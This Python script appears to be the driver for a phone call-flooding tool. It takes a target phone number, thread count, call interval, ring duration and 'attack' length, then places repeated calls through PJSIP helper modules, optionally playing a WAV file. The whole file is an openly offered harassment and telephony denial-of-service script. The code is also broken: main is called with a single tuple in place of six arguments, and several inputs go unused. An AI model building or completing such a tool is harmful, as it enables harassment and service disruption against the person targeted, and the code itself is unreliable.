import asyncio
import datetime
from decorators import time_checker
from pjsip_boostupper import pj_set_accounts,pj_set_target,pj_set_wav,pj_set_ring_duration
from call_making import make_call,make_call_with_wav

def init_info():
    target = input()  # + (country_code) XXXXXXXXXXXX (12X)
    threads = int(input("type how many threads"))
    speed = int(input("type how many seconds between calls"))
    ring_duration = int(input("type how many seconds is one call ringing"))
    attack_duration = datetime.time(minute=int(input("type how long in minutes will be attack going")))  # check if attack less than 12 hours (720 min)
    path_to_wav = input("type path to your wav file (if no wav press enter)")
    return target,threads,speed,ring_duration,attack_duration,path_to_wav

@time_checker
def start_attack_with_wav(target,attack_duration,ring_duration,speed):
    make_call_with_wav(target,ring_duration)
        
@time_checker
def start_attack(target,attack_duration,ring_duration,speed):
    make_call(target,ring_duration)
    
def main(target,threads,speed,ring_duration,attack_duration,path_to_wav):
    pj_set_target(target)
    pj_set_accounts()
    pj_set_ring_duration(ring_duration)
    if path_to_wav:
        pj_set_wav(path_to_wav)
        # in every thread'
        start_attack_with_wav(target,attack_duration,ring_duration,speed)
    else:
        start_attack(target,attack_duration,ring_duration,speed)




if __name__ == "__main__":
    main(init_info())
